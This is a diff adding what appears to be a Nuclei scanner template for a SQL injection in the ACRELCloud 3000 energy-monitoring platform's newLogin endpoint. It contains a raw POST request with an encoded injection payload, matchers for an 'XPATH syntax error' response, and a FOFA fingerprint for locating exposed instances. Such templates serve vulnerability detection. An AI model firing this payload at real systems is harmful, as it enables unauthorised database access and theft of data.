@@ -1,0 +1,39 @@
+id: acrelcloud-3000-newlogin-sqli
+
+info:
+  name: ACRELCloud 3000 newLogin - SQL Injection
+  author: qwtd
+  severity: high
+  description: |
+    ACRELCloud 3000 newLogin endpoint contains a SQL injection vulnerability. An attacker can execute arbitrary SQL queries to retrieve sensitive information from the database.
+  reference:
+    - https://github.com/wy876/POC/blob/main/%E5%AE%89%E7%A7%91%E7%91%9E/%E5%AE%89%E7%A7%91%E7%91%9E%E7%8E%AF%E4%BF%9D%E7%94%A8%E7%94%B5%E7%9B%91%E7%AE%A1%E4%BA%91%E5%B9%B3%E5%8F%B0newLogin%E5%AD%98%E5%9C%A8SQL%E6%B3%A8%E5%85%A5%E6%BC%8F%E6%B4%9E.md
+  metadata:
+    max-request: 1
+    fofa: body="myCss/phone.css"
+  tags: 安科瑞环保用电监管云平台
+
+http:
+  - raw:
+      - |
+        POST /Home/newLogin HTTP/1.1
+        Host: {{Hostname}}
+        Accept: application/json, text/javascript, */*; q=0.01
+        Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
+        Accept-Encoding: gzip, deflate
+        Content-Type: application/x-www-form-urlencoded; charset=UTF-8
+        X-Requested-With: XMLHttpRequest
+        Priority: u=0
+        User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:132.0) Gecko/20100101 Firefox/132.0
+        Content-Length: 193
+
+        data=AmILgROn2omEYq%2Bd8Urox8DW%2F8rRQwsBzOEz00K3cyMY1DhHq6oDzKni9uNo6p7VIuEZBk0edl%2Blr8MukZeYaoj5ogyFWf1wJQ6iDSwIHOKSdk2%2BRRo%2FbhB70T5AlQ3PB6Ca1I6PvvVefK%2BuEF6b%2BqnvUH5y0gix7tq3yw1WJdc%3D
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "XPATH syntax error"
+      - type: status
+        status:
+          - 200
